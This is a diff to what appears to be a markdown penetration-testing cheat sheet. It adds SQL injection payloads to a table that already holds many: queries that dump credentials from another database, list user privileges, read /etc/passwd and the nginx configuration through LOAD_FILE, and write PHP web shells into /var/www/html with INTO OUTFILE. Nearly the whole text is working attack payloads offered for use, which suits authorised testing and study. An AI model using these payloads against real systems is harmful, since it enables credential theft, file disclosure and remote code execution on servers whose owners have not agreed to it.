@@ -326,12 +326,15 @@ zoomeye
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
 | **Privileges** |
 | `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
+| `') UNION SELECT 1, 2, grantee, privilege_type FROM information_schema.user_privileges -- -`|find user permisions|
+|`') UNION SELECT 1, 2, LOAD_FILE('/etc/nginx/nginx.conf'), 4 -- -`|read conf files to identyfy the root dir|
 | `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
 | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
 | **File Injection** |
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
+|`') UNION SELECT 1, 2, '<?php system($_GET["cmd"]); ?>', 4 INTO OUTFILE '/var/www/html/shell.php' -- -`|write a backdor|
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
 # SQLMAP ESSENTIALS
